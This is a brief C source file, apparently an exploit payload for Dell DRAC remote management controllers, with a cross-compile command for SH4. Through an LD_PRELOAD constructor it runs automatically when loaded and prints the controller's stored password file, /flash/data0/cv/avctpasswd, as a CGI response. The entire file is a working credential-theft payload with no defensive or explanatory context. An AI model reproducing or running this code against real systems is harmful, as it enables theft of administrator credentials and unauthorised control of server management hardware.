// Grab DRAC user credentials

// To compile: sh4-linux-gnu-gcc-7 -shared -fPIC ./payload.c -o ./payload.so

#include <stdio.h>
#include <stdlib.h>

// The following line is a quick trick to get our function to run when this
// library is invoked with LD_PRELOAD
__attribute__ ((constructor)) int
main (void)
{
  printf ("Content-Type: text/plain\n\n");
  int c;
  FILE *fptr = fopen ("/flash/data0/cv/avctpasswd", "r");
  if (fptr == NULL)
    printf ("Error: File could not be opened \n");
  else
    {
      while ((c = getc (fptr)) != EOF)
        putchar (c);
      fclose (fptr);
    }
  exit(0);
  return 0;
}
